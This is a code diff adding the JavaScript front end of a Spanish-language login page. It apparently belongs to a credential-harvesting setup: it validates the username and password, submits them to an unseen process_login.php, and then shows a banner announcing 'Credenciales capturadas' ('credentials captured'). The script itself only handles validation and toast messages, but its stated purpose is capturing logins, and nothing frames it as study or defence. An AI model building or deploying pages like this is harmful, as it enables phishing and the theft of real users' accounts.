@@ -1,0 +1,83 @@
+// script.js
+
+document.addEventListener('DOMContentLoaded', function() {
+    const loginForm = document.getElementById('loginForm');
+    const body = document.body;
+
+    // 1. Manejar la redirección de éxito/error (si viene del PHP)
+    const urlParams = new URLSearchParams(window.location.search);
+    const status = urlParams.get('status');
+
+    if (status === 'success') {
+        displayMessage("¡Éxito! Credenciales capturadas.", "green");
+    } else if (status === 'error') {
+        displayMessage("Error al procesar el login.", "red");
+    }
+
+
+    // 2. Manejar el envío del formulario (antes de que PHP lo capture)
+    loginForm.addEventListener('submit', function(event) {
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+
+        // Validación extra en JS
+        if (usernameInput.value.trim() === "" || passwordInput.value.trim() === "") {
+            displayMessage("Por favor, rellena ambos campos.", "orange");
+            event.preventDefault(); // Detiene el envío al servidor si falta algo
+        } else {
+             // Opcional: Puedes añadir aquí una animación de carga antes de que PHP haga su trabajo
+             console.log("Enviando datos a process_login.php...");
+        }
+    });
+
+    /**
+     * Función para mostrar un mensaje temporal en la pantalla (Toast Notification)
+     * @param {string} message - El texto del mensaje.
+     * @param {string} type - El color ('green', 'red', 'orange').
+     */
+    function displayMessage(message, type) {
+        // Creamos un elemento temporal para el mensaje
+        const msgElement = document.createElement('div');
+        msgElement.classList.add('message-toast');
+        msgElement.textContent = message;
+
+        // Estilos básicos del toast (puedes añadir esto a style.css si quieres)
+        msgElement.style.cssText = `
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            z-index: 1000;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        `;
+
+        // Asignar color basado en el tipo
+        if (type === 'green') {
+            msgElement.style.backgroundColor = '#28a745'; // Verde éxito
+        } else if (type === 'red') {
+            msgElement.style.backgroundColor = '#dc3545'; // Rojo error
+        } else { // orange
+            msgElement.style.backgroundColor = '#ffc107'; // Amarillo/Naranja advertencia
+        }
+
+        // Añadir al cuerpo y hacerlo visible
+        body.appendChild(msgElement);
+        setTimeout(() => {
+            msgElement.style.opacity = '1';
+        }, 50); // Pequeño retraso para asegurar la transición
+
+        // Ocultarlo después de 3 segundos
+        setTimeout(() => {
+            msgElement.style.opacity = '0';
+            // Removerlo del DOM después de que la transición termine
+            setTimeout(() => msgElement.remove(), 500);
+        }, 3000);
+    }
+
+});
